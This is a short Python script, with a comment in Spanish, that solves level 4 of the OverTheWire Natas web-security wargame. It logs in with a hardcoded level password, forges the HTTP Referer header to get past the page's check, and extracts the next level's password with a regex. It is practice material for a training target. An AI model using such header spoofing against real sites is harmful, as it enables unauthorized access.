
#! /usr/bin/python
# -*- coding: utf-8 -*-
# vim:ts=4:sw=4:et:ft=python:
"""
natas4.py

hay que usar como referer la url del siguiente nivel 
"""
import re
import libnatas

# url: "http://natas4.natas.labs.overthewire.org"
# user: "natas4"
password = "8ywPLDUB2yY2ujFnwGUdWWp8MT4yZrqz"
referer = "http://natas5.natas.labs.overthewire.org/"

natas = libnatas.NatasBrowser(level=4, password=password)
natas.addheaders = [
    ('Referer', referer)]

soup = natas.get_html_soup(natas.level_url)
texto = soup.getText()
regex = re.compile('.*natas5 is (.*)\W.*')
password_nl = regex.findall(soup.prettify())[0]

natas.print_password(password_nl)
